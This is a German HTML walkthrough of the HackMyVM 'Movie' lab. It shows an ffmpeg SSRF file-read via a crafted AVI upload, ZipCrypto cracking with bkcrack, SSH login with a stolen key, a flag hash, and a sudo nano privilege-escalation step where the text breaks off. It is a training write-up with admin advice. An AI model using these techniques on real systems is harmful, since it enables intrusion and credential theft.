@@ -1,0 +1,701 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Movie - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Movie - HackMyVM - Medium - Bericht</h1> <!-- Titel und Level angepasst -->
+        <div class="level-container">
+            <!-- H2 ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte auf Gelb angepasst werden) -->
+            <h2>Medium</h2>
+            <div class="circle">
+                <!-- Segmente ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte auf Gelb angepasst werden) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Innerer Kreis ohne Inline-Style, Farbe wird durch CSS gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi / nano</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">python</div>
+                <div class="tool-item">fcrackzip</div>
+                <div class="tool-item">bkcrack</div>
+                <div class="tool-item">zip</div>
+                <div class="tool-item">unzip</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">lsattr</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">fg</div>
+                <div class="tool-item">export</div>
+                <div class="tool-item">mv</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">qrencode</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration & SSRF</a></li>
+                <li><a href="#initial-access">Initial Access (via ZIP Crack & SSH)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept (POC)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>192.168.2.117	08:00:27:e0:46:20	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` sendet ARP-Anfragen ins lokale Netzwerk, um aktive Geräte auf Layer 2 zu identifizieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Host mit der IP-Adresse `192.168.2.117` antwortet. Die MAC-Adresse `08:00:27:e0:46:20` gehört zu "PCS Systemtechnik GmbH", was ein bekannter OUI (Organizationally Unique Identifier) für Oracle VirtualBox ist. Das Zielsystem wurde erfolgreich im lokalen Netzwerk lokalisiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Der nächste Schritt ist ein Portscan (z.B. mit Nmap), um offene Dienste auf der identifizierten IP-Adresse zu finden.
+<br><strong>Empfehlung (Admin):** Netzwerk-Monitoring kann helfen, unerwartete Geräte oder übermäßige ARP-Scan-Aktivitäten zu erkennen. Die Verwendung von Virtualisierung ist hier offensichtlich; sicherheitsrelevante VMs sollten entsprechend gehärtet werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>[Inhalt der Datei nach Bearbeitung]
+127.0.0.1       localhost
+...
+<span class="command">192.168.2.117            movie.hmv</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei des Angreifer-Systems wird bearbeitet, um den Hostnamen `movie.hmv` der gefundenen IP-Adresse `192.168.2.117` zuzuordnen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein notwendiger Schritt, um Webanwendungen oder andere Dienste auf dem Zielsystem, die möglicherweise über diesen Hostnamen angesprochen werden müssen (z.B. wegen virtueller Host-Konfigurationen), korrekt zu erreichen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Nach dem Hinzufügen des Eintrags können Tools wie Webbrowser, `curl`, `gobuster` etc. den Hostnamen `movie.hmv` verwenden, um auf das Ziel zuzugreifen.
+<br><strong>Empfehlung (Admin):** Dies unterstreicht, dass Angreifer oft Hostnamen erraten oder finden und manuell mappen. DNS-Einträge und virtuelle Host-Konfigurationen sollten sicher und korrekt sein.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.117 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at ...
+Nmap scan report for movie.hmv (192.168.2.117)
+Host is up (0.00012s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span>
+| ssh-hostkey:
+|   <span class="command">3072 e7c14066c0bec886dd58214a03767812 (RSA)</span>
+|   <span class="command">256 869f0d8ff1e0629065cf79ee5ee31201 (ECDSA)</span>
+|_  <span class="command">256 2ae0ac8949dde53a8f47367a2f0711b8 (ED25519)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.54 ((Debian))</span>
+|_<span class="command">http-title: movie.hmv</span>
+|_<span class="command">http-server-header: Apache/2.4.54 (Debian)</span>
+MAC Address: 08:00:27:E0:46:20 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: <span class="command">Linux 4.X|5.X</span>
+OS CPE: <span class="command">cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span>
+OS details: <span class="command">Linux 4.15 - 5.6</span>
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms movie.hmv (192.168.2.117)
+
+Nmap done: 1 IP address (1 host up) scanned in ... seconds
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan (`-sS` Stealth SYN, `-sC` Default Scripts, `-T5` Insane Timing, `-A` Aggressive OS/Version/Script/Traceroute, `-p-` Alle Ports) wird gegen das Ziel `192.168.2.117` durchgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert zwei offene Ports:
+*   **Port 22 (SSH):** Läuft OpenSSH 8.4p1 auf Debian 11. Eine relativ moderne Version, weniger wahrscheinlich für direkte Exploits ohne Zugangsdaten.
+*   **Port 80 (HTTP):** Läuft Apache 2.4.54 auf Debian. Der Titel der Webseite ist "movie.hmv", was mit unserem Eintrag in `/etc/hosts` übereinstimmt.
+Das Betriebssystem wird als Linux (Kernel 4.x/5.x) erkannt. Die MAC-Adresse bestätigt erneut VirtualBox.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Der Webserver auf Port 80 ist der primäre Angriffsvektor. Eine detaillierte Web-Enumeration (Verzeichnisse, Dateien, Technologien, Schwachstellen) sollte folgen. SSH bleibt eine Option, falls Zugangsdaten gefunden werden.
+<br><strong>Empfehlung (Admin):** Halten Sie sowohl SSH als auch den Webserver auf dem neuesten Stand. Konfigurieren Sie Sicherheitsheader für Apache und unterdrücken Sie detaillierte Versionsinformationen. Beschränken Sie den SSH-Zugriff nach Möglichkeit auf bestimmte IPs oder verwenden Sie Key-basierte Authentifizierung.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration & SSRF</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://movie.hmv -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,war,jse,jar,asp,aspx,csv,rtf,doc,docx,dsd,mp3,mp4,mkv,log,sh,dll,exe,ico -b 404,403</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.2.0-dev
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     <span class="command">http://movie.hmv</span>
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   <span class="command">404,403</span>
+[+] User Agent:              gobuster/3.2.0-dev
+[+] Extensions:              <span class="command">asp,log,exe,ogg,zip,sql,txt,js,jse,aspx,doc,php,sh,mp3,docx,dsd,mp4,7z,flac,wav,jar,csv,py,jpg,war,git,aiff,png,tar,bak,rtf,mkv,xml,pl,jpeg,aac,alac,dll,ico,html</span>
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/10/31 00:11:13 Starting gobuster in directory enumeration mode
+===============================================================
+<span class="command">http://movie.hmv/index.php</span>            (Status: 200) [Size: 552]
+<span class="command">http://movie.hmv/home.html</span>            (Status: 200) [Size: 552]
+<span class="command">http://movie.hmv/sitemap.xml</span>          (Status: 200) [Size: 762]
+<span class="command">http://movie.hmv/data</span>                 (Status: 301) [Size: 305] [--> http://movie.hmv/data/]
+<span class="command">http://movie.hmv/upload.php</span>           (Status: 200) [Size: 0]
+<span class="command">http://movie.hmv/dist</span>                 (Status: 301) [Size: 305] [--> http://movie.hmv/dist/]
+<span class="command">http://movie.hmv/404.html</span>             (Status: 200) [Size: 920]
+<span class="command">http://movie.hmv/data/index.php</span>            (Status: 302) [Size: 0] [--> login.php]
+<span class="command">http://movie.hmv/data/login.php</span>            (Status: 200) [Size: 449]
+<span class="command">http://movie.hmv/data/image.png</span>            (Status: 200) [Size: 5096]
+<span class="command">http://movie.hmv/data/logout.php</span>           (Status: 302) [Size: 0] [--> login.php]
+<span class="command">http://movie.hmv/data/config.php</span>           (Status: 200) [Size: 0]
+<span class="command">http://movie.hmv/data/dist</span>                 (Status: 301) [Size: 310] [--> http://movie.hmv/data/dist/]
+<span class="command">http://movie.hmv/data/404.html</span>             (Status: 200) [Size: 920]
+<span class="command">http://movie.hmv/dist/img</span>                  (Status: 301) [Size: 309] [--> http://movie.hmv/dist/img/]
+<span class="command">http://movie.hmv/dist/css</span>                  (Status: 301) [Size: 309] [--> http://movie.hmv/dist/css/]
+<span class="command">http://movie.hmv/dist/js</span>                   (Status: 301) [Size: 308] [--> http://movie.hmv/dist/js/]
+===============================================================
+2022/10/31 00:14:34 Finished
+===============================================================
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird verwendet, um Verzeichnisse und Dateien auf dem Webserver `http://movie.hmv` zu finden. Es verwendet die `directory-list-2.3-medium.txt`-Wortliste und testet eine Vielzahl von Dateierweiterungen (`-x ...`). Statuscodes 403 und 404 werden ignoriert (`-b`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Mehrere interessante Pfade werden entdeckt:
+*   `/upload.php`: Eine Seite zum Hochladen von Dateien. Dies ist oft ein Angriffsvektor.
+*   `/data/`: Ein Verzeichnis, das eine `login.php`, `logout.php` und eine leere `config.php` enthält. Das Vorhandensein einer `config.php` ist bemerkenswert, auch wenn sie leer erscheint (Größe 0). Die Login-Seite `/data/login.php` deutet auf einen geschützten Bereich hin.
+*   `/dist/`: Enthält wahrscheinlich statische Assets (CSS, JS, Bilder).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Untersuchen Sie `/upload.php`. Welche Dateitypen werden akzeptiert? Gibt es Größenbeschränkungen? Wird der Dateiname oder -typ validiert? Untersuchen Sie `/data/login.php` auf mögliche Schwachstellen (SQL-Injection, Default-Credentials). Auch wenn `/data/config.php` leer ist, deutet der Name darauf hin, dass hier Konfigurationen gespeichert werden könnten - möglicherweise über andere Mittel lesbar?
+<br><strong>Empfehlung (Admin):** Beschränken Sie den Zugriff auf Upload-Funktionen. Validieren Sie Dateitypen und -namen serverseitig streng. Speichern Sie Uploads außerhalb des Web-Roots oder ohne Ausführungsberechtigungen. Sichern Sie Konfigurationsdateien (z.B. durch Speichern außerhalb des Web-Roots und korrekte Berechtigungen). Entfernen Sie nicht benötigte Dateien oder Verzeichnisse.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Basierend auf der Beobachtung einer Upload-Funktion (`upload.php`) und dem Thema "Movie" wird eine bekannte Schwachstelle in `ffmpeg` vermutet. `ffmpeg` wird oft serverseitig zur Videokonvertierung verwendet. Ältere Versionen sind anfällig für Server-Side Request Forgery (SSRF) durch speziell präparierte Videodateien oder Playlists, die `ffmpeg` veranlassen, interne URLs anzufordern. Der Angreifer sucht auf GitHub nach Exploits ("google: ffmpeg exploit github ssrf") und findet ein Python-Skript (`gen_avi.py`), das eine solche anfällige AVI-Datei erstellt.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">wget https://raw.githubusercontent.com/cujanovic/SSRF-Testing/master/ffmpeg/gen_avi.py</span></div>
+                    <pre>--2022-10-31 00:20:00--  https://raw.githubusercontent.com/cujanovic/SSRF-Testing/master/ffmpeg/gen_avi.py
+Auflösen des Hostnamens raw.githubusercontent.com (raw.githubusercontent.com)… 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
+Verbindungsaufbau zu raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: 1119 (1,1K) [text/plain]
+Wird in »gen_avi.py« gespeichert.
+
+gen_avi.py          100%[===================>]   1,1K  --.-KB/s    in 0s
+
+2022-10-31 00:20:01 (7,27 MB/s) - »gen_avi.py« gespeichert [1119/1119]
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Das heruntergeladene Skript `gen_avi.py` wird verwendet, um eine AVI-Datei (`config.avi`) zu erstellen. Diese Datei ist so präpariert, dass sie `ffmpeg` anweist, den Inhalt der lokalen Datei `file:///var/www/html/data/config.php` (der tatsächliche Speicherort der zuvor gefundenen, aber leer erscheinenden `config.php`) abzurufen und in die Ausgabedatei einzubetten.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+ └─# <span class="command">python gen_avi.py file:///var/www/html/data/config.php config.avi</span></div>
+                     <pre>[*] Generating sample AVI file</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Die generierte Datei `config.avi` wird dann über `http://movie.hmv/upload.php` hochgeladen. Die Webseite bestätigt den Upload und gibt einen Link zur konvertierten Datei (`config.mp4`) zurück.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Ausgabe der Webseite nach Upload]</div>
+                     <pre>
+ Your file has been successfully uploaded.
+ <span class="command">http://movie.hmv/converted_videos/config.mp4</span>
+ </pre>
+                  </div>
+              </div>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Der Angreifer lädt die konvertierte Datei `config.mp4` herunter.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Befehl impliziert]
+<span class="command">wget http://movie.hmv/converted_videos/config.mp4</span></div>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Beim Betrachten der heruntergeladenen `config.mp4`-Datei (z.B. mit einem Texteditor oder `strings`) werden die Inhalte der ursprünglichen `config.php` sichtbar gemacht, einschließlich Datenbank-Zugangsdaten.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Inhalt aus der .mp4 Datei extrahiert]</div>
+                     <pre>
+ Username: <span class="command">tarantino</span>
+ passwort: <span class="password">killer</span>
+ dbname  : <span class="command">moviedb</span>
+ </pre>
+                  </div>
+              </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein erfolgreicher Exploit einer SSRF-Schwachstelle in `ffmpeg`, ausgelöst durch die Dateiupload-Funktion. Der Angreifer konnte eine interne Datei (`config.php`) lesen und sensible Datenbank-Zugangsdaten (`tarantino`:`killer`) extrahieren. Die Tatsache, dass `config.php` bei direktem Zugriff leer erschien, aber über `file:///` lesbar war, ist ein interessantes Detail.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Die gefundenen Datenbank-Zugangsdaten (`tarantino`:`killer`) sollten sofort getestet werden. Da der Benutzername `tarantino` ist, ist es sehr wahrscheinlich, dass dies auch die SSH-Zugangsdaten für diesen Benutzer sind. Versuchen Sie einen SSH-Login mit `tarantino:killer`.
+<br><strong>Empfehlung (Admin):** Aktualisieren Sie `ffmpeg` dringend auf eine gepatchte Version. Implementieren Sie eine strikte serverseitige Validierung von Eingaben, die an `ffmpeg` übergeben werden, insbesondere Dateipfade und URLs. Lassen Sie `ffmpeg` idealerweise in einer isolierten Umgebung (Container, Jail) mit minimalen Rechten laufen. Schützen Sie Konfigurationsdateien, indem Sie sie außerhalb des Web-Roots speichern und die Dateiberechtigungen korrekt setzen. Überwachen Sie die Upload-Funktion auf verdächtige Aktivitäten.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (via ZIP Crack & SSH)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Parallel zur SSRF-Untersuchung oder als Ergebnis weiterer Enumeration (nicht im Detail gezeigt) wurde eine passwortgeschützte ZIP-Datei namens `mydata_archive.zip` gefunden und heruntergeladen. Ein erster Versuch, sie mit `unzip` zu entpacken, scheitert an einem falschen Passwort. Ein Versuch mit `fcrackzip` (einem Tool zum Knacken von ZIP-Passwörtern) wird gestartet, aber anscheinend ohne Erfolg oder abgebrochen (keine Ausgabe gezeigt).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+ └─# <span class="command">unzip mydata_archive.zip</span></div>
+                     <pre>
+ Archive:  mydata_archive.zip
+ [mydata_archive.zip] 404.html password: <span class="password">[FAILED_PASSWORD_ATTEMPT]</span>
+ password incorrect--reenter: <span class="password">[FAILED_PASSWORD_ATTEMPT]</span>
+ password incorrect--reenter: <span class="password">[FAILED_PASSWORD_ATTEMPT]</span>
+    skipping: 404.html                incorrect password
+ [mydata_archive.zip] home.html password: <span class="password">[FAILED_PASSWORD_ATTEMPT]</span>
+ password incorrect--reenter:       <span class="password">[FAILED_PASSWORD_ATTEMPT]</span>
+ ...
+ </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+ └─# <span class="command">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt mydata_archive.zip</span></div>
+                     <pre>[Keine Erfolgsmeldung gezeigt]</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Da einfache Passwort-Cracking-Methoden fehlschlagen, wird ein Angriff auf die schwache ZipCrypto-Verschlüsselung mit `bkcrack` vorbereitet. Dieser Angriff erfordert oft eine bekannte Klartext-Datei (eine unverschlüsselte Version einer Datei, die sich im verschlüsselten Archiv befindet) oder, wie hier anscheinend verwendet, vorab berechnete interne Schlüssel. Der Angreifer macht `bkcrack` ausführbar. Es wird angenommen, dass die internen Schlüssel (`d706e724 da372a68 a79864b0`) durch eine vorherige Analyse (z.B. durch Analyse des Quellcodes der Anwendung, die das ZIP erstellt hat, oder einen anderen Informationsleak) bekannt wurden.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/bkcrack-1.5.0-Linux]
+└─# <span class="command">chmod +x bkcrack</span></div>
+                    <!-- ./bkcrack ohne Argumente zeigt Hilfe oder Version -->
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/bkcrack-1.5.0-Linux]
+└─# <span class="command">./bkcrack</span></div>
+                     <pre>[Hilfetext oder Versionsinfo von bkcrack wird angezeigt]</pre>
+                    <!-- Die folgenden nano/zip Befehle scheinen im Kontext von bkcrack nicht direkt relevant für den finalen -k Angriff, könnten aber Teil eines fehlgeschlagenen Plaintext-Versuchs gewesen sein. -->
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/bkcrack-1.5.0-Linux]
+└─# <span class="command">nano site.xml</span></div>
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/bkcrack-1.5.0-Linux]
+└─# <span class="command">zip site.zip site.xml</span></div>
+                     <pre>adding: site.xml (stored 0%)</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse Fortsetzung:** `bkcrack` wird mit den bekannten internen Schlüsseln (`-k ...`) auf das verschlüsselte Archiv (`-C mydata_archive.zip`) angewendet. Die Option `-U out.zip password` weist `bkcrack` an, den entschlüsselten Inhalt in eine neue ZIP-Datei `out.zip` zu schreiben und diese neue Datei mit dem einfachen Passwort "password" zu schützen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/bkcrack-1.5.0-Linux]
+ └─# <span class="command">./bkcrack -C mydata_archive.zip -k d706e724 da372a68 a79864b0 -U out.zip password</span></div>
+                     <pre>
+ bkcrack 1.5.0 - 2022-07-07
+ [01:00:09] Writing unlocked archive out.zip with password "password"
+ 100.0 % (6 / 6)
+ <span class="password">Wrote unlocked archive.</span>
+ </pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Das neu erstellte, mit "password" geschützte Archiv `out.zip` wird nun entpackt.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/bkcrack-1.5.0-Linux]
+ └─# <span class="command">unzip out.zip</span></div>
+                     <pre>
+ Archive:  out.zip
+ [out.zip] 404.html password: <span class="password">password</span>
+  extracting: 404.html
+  extracting: home.html
+  extracting: <span class="password">id_rsa</span>
+  extracting: index.php
+  extracting: sitemap.xml
+  extracting: upload.php
+ </pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Angriff auf die ZipCrypto-Verschlüsselung mittels `bkcrack` und bekannter interner Schlüssel war erfolgreich. Aus dem entschlüsselten Archiv konnte eine entscheidende Datei extrahiert werden: `id_rsa`. Dies ist mit hoher Wahrscheinlichkeit ein privater SSH-Schlüssel.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Setzen Sie die korrekten Berechtigungen für die Datei `id_rsa` (`chmod 600`). Versuchen Sie, sich mit diesem Schlüssel per SSH beim Zielsystem anzumelden. Der Benutzername könnte `tarantino` sein (aus den Datenbank-Credentials bekannt) oder ein anderer Benutzer, der auf dem System existiert.
+<br><strong>Empfehlung (Admin):** Verwenden Sie keine veralteten oder schwachen Verschlüsselungsalgorithmen wie ZipCrypto für sensible Archive. Nutzen Sie stattdessen starke Verschlüsselung (z.B. AES über 7-Zip oder GPG). Schützen Sie die internen Schlüssel oder Passwörter, die zur Erstellung solcher Archive verwendet werden. Stellen Sie sicher, dass private SSH-Schlüssel niemals in Archiven oder an unsicheren Orten gespeichert werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/bkcrack-1.5.0-Linux]
+└─# <span class="command">chmod 600 id_rsa</span></div>
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/bkcrack-1.5.0-Linux]
+└─# <span class="command">ssh -i id_rsa tarantino@movie.hmv</span></div>
+                    <pre>
+The authenticity of host 'movie.hmv (192.168.2.117)' can't be established.
+ED25519 key fingerprint is SHA256:+qYQbhV1LDHwVLxJqteqtRT11HxWqj3b4asy8JNhY.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span>
+Warning: Permanently added 'movie.hmv' (ED25519) to the list of known hosts.
+Linux movie.hmv 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Oct  5 08:17:15 2022 from 192.168.0.22
+</pre>
+                    <div class="prompt">tarantino@movie:~$</div>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Berechtigungen für den extrahierten privaten Schlüssel `id_rsa` werden auf `600` gesetzt (nur Lesen/Schreiben für den Besitzer), was für SSH erforderlich ist. Anschließend wird versucht, sich per SSH mit diesem Schlüssel (`-i id_rsa`) als Benutzer `tarantino` (dessen Name aus den DB-Credentials bekannt war) beim Ziel `movie.hmv` anzumelden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der SSH-Login ist erfolgreich! Nach Bestätigung des Host-Schlüssels wird der Angreifer als Benutzer `tarantino` auf dem System angemeldet. Dies stellt den initialen Zugriff dar.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Der erste Schritt nach dem Login ist die grundlegende Enumeration als Benutzer `tarantino`: Überprüfen der `sudo`-Rechte (`sudo -l`), Suchen nach dem User-Flag (oft im Home-Verzeichnis), Auflisten von Verzeichnissen, Prozessen und Netzwerkverbindungen, um potenzielle Wege zur Privilegieneskalation zu finden.
+<br><strong>Empfehlung (Admin):** Der erfolgreiche Login mit einem gestohlenen privaten Schlüssel zeigt, dass dieser Schlüssel kompromittiert wurde. Der Schlüssel sollte sofort aus der `authorized_keys`-Datei des Benutzers `tarantino` entfernt und als ungültig betrachtet werden. Untersuchen Sie, wie die ZIP-Datei mit dem Schlüssel ursprünglich auf das System gelangte oder erstellt wurde. Stärken Sie die Sicherheitsmaßnahmen rund um die Speicherung und den Schutz von SSH-Schlüsseln.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">tarantino@movie:~$ <span class="command">ls -la</span></div>
+                    <pre>
+total 32
+drwxr-xr-x 4 tarantino tarantino 4096 Oct  1 09:31 .
+drwxr-xr-x 3 root      root      4096 Sep 24 11:10 ..
+lrwxrwxrwx 1 root      root         9 Sep 25 14:39 .bash_history -> /dev/null
+-rw-r--r-- 1 tarantino tarantino  220 Sep 24 11:10 .bash_logout
+-rw-r--r-- 1 tarantino tarantino 3526 Sep 24 11:10 .bashrc
+drwxr-xr-x 3 tarantino tarantino 4096 Sep 27 08:23 .local
+-rw-r--r-- 1 tarantino tarantino  807 Sep 24 11:10 .profile
+drwx------ 2 tarantino tarantino 4096 Sep 25 14:59 .ssh
+-rwx------ 1 tarantino tarantino   33 Oct  1 09:31 <span class="command">user.txt</span>
+</pre>
+                    <div class="prompt">tarantino@movie:~$ <span class="command">cat user.txt</span></div>
+                    <pre><span class="password">0508e6506868d4b9d3f8545054d3e8db</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Im Home-Verzeichnis des Benutzers `tarantino` wird der Inhalt aufgelistet. Eine Datei namens `user.txt` wird gefunden und ihr Inhalt angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das User-Flag `<span class="password">0508e6506868d4b9d3f8545054d3e8db</span>` wurde erfolgreich gefunden und ausgelesen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** User-Flag dokumentieren. Nun vollständig auf die Privilegieneskalation konzentrieren.
+<br><strong>Empfehlung (Admin):** In einem realen Szenario sicherstellen, dass sensible Daten (repräsentiert durch das Flag) angemessen geschützt sind.</p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Es werden die `sudo`-Berechtigungen für den aktuellen Benutzer `tarantino` überprüft.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">tarantino@movie:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for tarantino on movie:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User tarantino may run the following commands on movie:
+    <span class="command">(root) NOPASSWD: /usr/bin/nano /etc/passwd</span>
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! Der Benutzer `tarantino` darf den Texteditor `nano` als Root (`(root)`) ausführen, um die Datei `/etc/passwd` zu bearbeiten, und das ohne Passwortabfrage (`NOPASSWD`). Obwohl `/etc/passwd` selbst möglicherweise nicht direkt beschreibbar ist (siehe nächster Schritt), erlauben viele Versionen von `nano` das Ausführen von Befehlen aus dem Editor heraus. Dies ist ein klassischer Vektor zur Privilegieneskalation.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Nutzen Sie die `sudo nano`-Berechtigung aus:
+1.  Starten Sie `sudo /usr/bin/nano /etc/passwd`.
+2.  Verwenden Sie innerhalb von `nano` eine Funktion zum Ausführen von Befehlen (z.B. `Ctrl+R` gefolgt von `Ctrl+X` und dem Befehl, oder `Ctrl+T` in neueren Versionen).
